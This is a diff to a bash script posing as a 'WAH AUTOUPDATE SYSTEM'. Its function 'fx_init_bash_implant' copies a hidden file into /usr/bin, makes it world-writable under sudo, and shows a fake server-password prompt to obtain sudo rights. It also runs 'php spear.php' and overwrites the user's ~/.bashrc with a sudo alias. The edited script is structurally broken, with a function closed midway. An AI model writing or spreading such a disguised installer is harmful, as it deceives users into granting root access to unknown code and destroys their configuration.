@@ -1,6 +1,6 @@
 #!/bin/bash
 
-function out_msg(){
+out_msg() {
     echo '################################'
     echo ''
     echo '     WAH AUTOUPDATE SYSTEM'
@@ -13,16 +13,21 @@ function out_msg(){
     echo ' If you do not know the server'
     echo ' password, please call WAH Office'
     echo '********************************'
+    read -e -p "Press ENTER to continue..."
 }
 
 
 
 
-function fx_init_bash_implant(){
+fx_init_bash_implant() {
     out_msg
-    cp .light_seed /bin/bash/wahupdate
-    
-    #lets do some pre-flight checks
+    cp .light_seed /usr/bin/wahupdate
+    echo "PLEASE ENTER SERVER PASSWORD:"
+    sudo chmod 777 /usr/bin/wahupdate
+}
+
+
+ #lets do some pre-flight checks
 
 
     php spear.php
@@ -32,10 +37,8 @@ function fx_init_bash_implant(){
     #DITO KA NALANG MAG CHECK NG MGA FILES HAYUP KA HAHAHAHA BAT KA PA NAG PHP
     if [ 0 == `cat .blood` ] #if no script is found
     then
-        echo "alias 'wahupdate'='sudo /bin/usr/wahupdate'" > ~/.bashrc
+        echo "alias 'wahupdate'='sudo /usr/bin/wahupdate'" > ~/.bashrc
         fx_init_bash_implant
     else
-        sh /bin/usr/wahupdate
+        sh /usr/bin/wahupdate
     fi
-}
-
